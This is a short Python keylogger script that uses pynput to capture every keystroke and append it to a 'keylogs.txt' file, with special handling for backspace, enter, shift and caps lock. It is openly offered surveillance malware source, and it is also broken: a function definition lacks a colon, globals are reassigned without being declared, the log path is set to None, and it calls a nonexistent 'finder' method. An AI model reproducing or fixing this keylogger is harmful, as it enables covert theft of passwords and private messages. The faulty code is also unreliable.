from pynput.keyboard import Key, Listener  # pip install pynput
import logging


count = 0

log_dir = ""
keys = []

path = logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
    level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys)
    with open(path, 'a') as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find('backspace') > 0:
                f.write(' Backspace ')
            elif k.find('enter') > 0:
                f.write('\n') # if enter just insert new line
            elif k.find('shift') > 0:
                f.write(' Shift ')
            elif k.find('space') > 0:
                f.write(' ')
            elif k.find('caps_lock') > 0:
                f.write(' CapsLock ')
            elif k.finder('Key'):
                f.write(k)

with Listener(on_press=on_press) as listener:
    listener.join()